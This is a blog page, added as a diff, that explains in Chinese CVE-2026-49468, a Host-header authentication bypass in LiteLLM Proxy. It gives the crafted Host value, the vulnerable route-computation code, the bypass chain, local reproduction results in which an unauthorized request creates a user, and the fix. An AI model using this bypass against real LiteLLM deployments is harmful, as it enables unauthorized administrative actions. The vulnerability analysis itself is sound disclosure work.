@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CVE-2026-49468 原理说明漏洞概述CVE-2026-49468 是 LiteLLM Proxy 的 Host Header 认证绕过漏洞。 受影响版本中，LiteLLM 在鉴权前会计算当前请求路由，并基于该路由判断：  是否是 public route 是否需要 API key 鉴权 当前 key 是否允许访问该路由  问题在于旧版 LiteLLM 使用了 Starlette&amp;#x2F">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Z3r4y : Take it easy">
+<meta property="og:url" content="http://example.com/images/04/cve_49468_principle.html">
+<meta property="og:site_name" content="Z3r4y : Take it easy">
+<meta property="og:description" content="CVE-2026-49468 原理说明漏洞概述CVE-2026-49468 是 LiteLLM Proxy 的 Host Header 认证绕过漏洞。 受影响版本中，LiteLLM 在鉴权前会计算当前请求路由，并基于该路由判断：  是否是 public route 是否需要 API key 鉴权 当前 key 是否允许访问该路由  问题在于旧版 LiteLLM 使用了 Starlette&amp;#x2F">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-06-20T19:22:38.208Z">
+<meta property="article:modified_time" content="2026-06-20T19:21:59.234Z">
+<meta property="article:author" content="Z3r4y">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Z3r4y : Take it easy</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Z3r4y : Take it easy</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   --><!--
+     --><li><a href="/archives/">Writing</a></li><!--
+   --><!--
+     --><li><a target="_blank" rel="noopener" href="https://github.com/Z3r4y">Projects</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  
+
+  <div class="content" itemprop="articleBody">
+      
+          <h1 id="CVE-2026-49468-原理说明"><a href="#CVE-2026-49468-原理说明" class="headerlink" title="CVE-2026-49468 原理说明"></a>CVE-2026-49468 原理说明</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>CVE-2026-49468 是 LiteLLM Proxy 的 Host Header 认证绕过漏洞。</p>
+<p>受影响版本中，LiteLLM 在鉴权前会计算当前请求路由，并基于该路由判断：</p>
+<ul>
+<li>是否是 public route</li>
+<li>是否需要 API key 鉴权</li>
+<li>当前 key 是否允许访问该路由</li>
+</ul>
+<p>问题在于旧版 LiteLLM 使用了 Starlette&#x2F;FastAPI 的 <code>request.url.path</code> 作为鉴权路由来源，而 <code>request.url</code> 会受 <code>Host</code> header 影响。</p>
+<p>当攻击者构造畸形 <code>Host</code> header，例如：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:14000/?x=1</span><br></pre></td></tr></table></figure>
+
+<p>Starlette 会把真实请求路径拼接进一个已经被 <code>?</code> 污染的 URL，导致 <code>request.url.path</code> 被解析成 <code>/</code>。</p>
+<p>LiteLLM 认证层因此把受保护路由误判为 public route <code>/</code>，从而跳过 API key 校验。</p>
+<h2 id="正常请求行为"><a href="#正常请求行为" class="headerlink" title="正常请求行为"></a>正常请求行为</h2><p>正常请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/new</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:14000</span><br></pre></td></tr></table></figure>
+
+<p>Starlette 构造出的 URL：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:14000/user/new</span><br></pre></td></tr></table></figure>
+
+<p>关键字段：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scope[&quot;path&quot;]       = /user/new</span><br><span class="line">request.url.path    = /user/new</span><br><span class="line">request.base_url    = http://127.0.0.1:14000/</span><br><span class="line">request.base_url.path = /</span><br></pre></td></tr></table></figure>
+
+<p>LiteLLM 旧版 <code>get_request_route()</code> 最终得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/new</span><br></pre></td></tr></table></figure>
+
+<p><code>/user/new</code> 是受保护管理接口，因此无 Authorization 时返回 401。</p>
+<h2 id="畸形-Host-请求行为"><a href="#畸形-Host-请求行为" class="headerlink" title="畸形 Host 请求行为"></a>畸形 Host 请求行为</h2><p>畸形 Host 请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/new</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:14000/?x=1</span><br></pre></td></tr></table></figure>
+
+<p>真实 HTTP request line 里的路径仍然是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/new</span><br></pre></td></tr></table></figure>
+
+<p>也就是 ASGI scope 中仍然是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scope[&quot;path&quot;] = /user/new</span><br></pre></td></tr></table></figure>
+
+<p>但 Starlette 在构造 <code>request.url</code> 时会直接拼接 Host header：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;scheme&#125;</span>://<span class="subst">&#123;host_header&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>因此得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:14000/?x=1/user/new</span><br></pre></td></tr></table></figure>
+
+<p>按 URL 语法，<code>?</code> 后面的内容会被当成 query string，所以 URL 的 path 被解析成：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.url.path = /</span><br></pre></td></tr></table></figure>
+
+<p>本地 1.83.14 容器中观测到的字段：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host: 127.0.0.1:14000/?x=1</span><br><span class="line">scope.path: /user/new</span><br><span class="line">request.url: http://127.0.0.1:14000/?x=1/user/new</span><br><span class="line">request.url.path: /</span><br><span class="line">request.base_url: http://127.0.0.1:14000/?x=1/</span><br><span class="line">request.base_url.path: /</span><br></pre></td></tr></table></figure>
+
+<h2 id="LiteLLM-旧版路由计算问题"><a href="#LiteLLM-旧版路由计算问题" class="headerlink" title="LiteLLM 旧版路由计算问题"></a>LiteLLM 旧版路由计算问题</h2><p>受影响版本中的 <code>get_request_route()</code> 逻辑：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_request_route</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(request, <span class="string">&quot;base_url&quot;</span>) <span class="keyword">and</span> request.url.path.startswith(</span><br><span class="line">            request.base_url.path</span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">return</span> request.url.path[<span class="built_in">len</span>(request.base_url.path) - <span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> request.url.path</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> request.url.path</span><br></pre></td></tr></table></figure>
+
+<p>在畸形 Host 请求中：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request.url.path = /</span><br><span class="line">request.base_url.path = /</span><br></pre></td></tr></table></figure>
+
+<p>所以 LiteLLM 得到的鉴权路由是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/</span><br></pre></td></tr></table></figure>
+
+<p>而 <code>/</code> 在 LiteLLM 中属于 public route。</p>
+<h2 id="鉴权绕过链路"><a href="#鉴权绕过链路" class="headerlink" title="鉴权绕过链路"></a>鉴权绕过链路</h2><p>完整链路：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /user/new</span><br><span class="line">Host: 127.0.0.1:14000/?x=1</span><br><span class="line">无 Authorization</span><br><span class="line"></span><br><span class="line">-&gt; Starlette request.url = http://127.0.0.1:14000/?x=1/user/new</span><br><span class="line">-&gt; request.url.path = /</span><br><span class="line">-&gt; LiteLLM get_request_route() 返回 /</span><br><span class="line">-&gt; / 是 LiteLLM public route</span><br><span class="line">-&gt; user_api_key_auth 跳过 API key 鉴权</span><br><span class="line">-&gt; FastAPI 仍按 scope[&quot;path&quot;]=/user/new 分发到 /user/new handler</span><br><span class="line">-&gt; /user/new 被未授权执行</span><br></pre></td></tr></table></figure>
+
+<p>关键矛盾是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">鉴权层看到：/</span><br><span class="line">路由层执行：/user/new</span><br></pre></td></tr></table></figure>
+
+<h2 id="本地复现结果"><a href="#本地复现结果" class="headerlink" title="本地复现结果"></a>本地复现结果</h2><p>复现版本：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LiteLLM 1.83.14</span><br></pre></td></tr></table></figure>
+
+<p>PoC：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/albert/Downloads/AliRedTeam/0day/litellm-lab/pocs/poc_49468.py</span><br></pre></td></tr></table></figure>
+
+<p>正常 Host，无 Authorization：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /user/new</span><br><span class="line">Host: 127.0.0.1:14000</span><br><span class="line"></span><br><span class="line">结果：401</span><br><span class="line">Authentication Error, No api key passed in.</span><br></pre></td></tr></table></figure>
+
+<p>畸形 Host，无 Authorization：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /user/new</span><br><span class="line">Host: 127.0.0.1:14000/?x=1</span><br><span class="line"></span><br><span class="line">结果：200</span><br><span class="line">成功创建 internal_user</span><br></pre></td></tr></table></figure>
+
+<p>PoC 输出：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">baseline-no-auth-normal-host: 401</span><br><span class="line">crafted-host-attempt-1: 200</span><br><span class="line">bypass_host=&#x27;127.0.0.1:14000/?x=1&#x27;</span><br><span class="line">verdict=LIKELY VULNERABLE</span><br></pre></td></tr></table></figure>
+
+<h2 id="修复思路"><a href="#修复思路" class="headerlink" title="修复思路"></a>修复思路</h2><p>修复后的逻辑不再依赖 <code>request.url.path</code>，而是使用 ASGI scope 中的原始路径：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">raw_path = <span class="built_in">str</span>(scope.get(<span class="string">&quot;path&quot;</span>, request.url.path))</span><br><span class="line">root_path = <span class="built_in">str</span>(scope.get(<span class="string">&quot;app_root_path&quot;</span>, scope.get(<span class="string">&quot;root_path&quot;</span>, <span class="string">&quot;&quot;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>修复后路由计算大致逻辑：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_request_route</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        scope = request.scope</span><br><span class="line">        raw_path = <span class="built_in">str</span>(scope.get(<span class="string">&quot;path&quot;</span>, request.url.path))</span><br><span class="line">        root_path = <span class="built_in">str</span>(scope.get(<span class="string">&quot;app_root_path&quot;</span>, scope.get(<span class="string">&quot;root_path&quot;</span>, <span class="string">&quot;&quot;</span>)))</span><br><span class="line">        <span class="keyword">if</span> root_path <span class="keyword">and</span> root_path != <span class="string">&quot;/&quot;</span> <span class="keyword">and</span> raw_path.startswith(root_path):</span><br><span class="line">            <span class="keyword">return</span> raw_path[<span class="built_in">len</span>(root_path):]</span><br><span class="line">        <span class="keyword">return</span> raw_path</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(request.url.path)</span><br></pre></td></tr></table></figure>
+
+<p>修复核心：</p>
+<ul>
+<li>不使用会被 Host header 影响的 <code>request.url.path</code> 作为鉴权路径</li>
+<li>改用 <code>scope[&quot;path&quot;]</code></li>
+<li><code>scope[&quot;path&quot;]</code> 来自 HTTP request line，由 ASGI server 设置</li>
+<li>Host header 无法把 <code>scope[&quot;path&quot;]</code> 从 <code>/user/new</code> 改成 <code>/</code></li>
+</ul>
+<h2 id="影响条件"><a href="#影响条件" class="headerlink" title="影响条件"></a>影响条件</h2><p>该漏洞是未授权认证绕过，但实际利用需要满足：</p>
+<ul>
+<li>攻击者能够控制发送到 LiteLLM Proxy 的 <code>Host</code> header</li>
+<li>前置 nginx、Ingress、ALB、API Gateway 等没有严格校验或重写 Host</li>
+<li>LiteLLM 暴露的 protected route 存在可被无鉴权执行后产生影响的接口</li>
+</ul>
+<p>如果前置组件强制校验 Host 或覆盖 Host，实际利用面会下降。</p>
+
+        
+  </div>
+</article>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Z3r4y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Z3r4y">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
